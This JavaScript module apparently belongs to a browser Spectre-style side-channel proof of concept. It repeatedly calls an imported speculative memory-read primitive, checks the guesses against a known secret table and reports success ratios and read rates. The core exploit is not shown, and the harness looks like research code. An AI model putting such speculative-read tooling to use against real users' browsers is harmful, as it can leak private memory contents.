import speculativelyReadAddress_promise from "../speculatively-read-address.js";

export default
(async () => {
    const {speculativelyReadAddress} = await speculativelyReadAddress_promise;
    const {secret_table} = await speculativelyReadAddress_promise;
    
    return function statisticallyReadMemory(address, speculative_repetitions, repetitions, min_iterations, max_cache_hit_number, page_size, probe_length) {
        const begin = performance.now();
        let successes = 0;
        let mean_second_ratio = 0;
        for (let i = 0; i < repetitions; ++i) {
            const {
                max_indicator_index,
                second_ratio
            } = speculativelyReadAddress(address, speculative_repetitions, min_iterations, max_cache_hit_number, page_size, probe_length);
            console.log("estimated memory value", max_indicator_index);
            console.log("sir", second_ratio);
            if (max_indicator_index == secret_table[address]) {
                ++successes;
                mean_second_ratio += second_ratio;
            }
        }
        return {
            success_ratio: successes / repetitions,
            success_rate: successes / (performance.now() - begin) * 1e3,
            mean_second_ratio
        };
    }
})();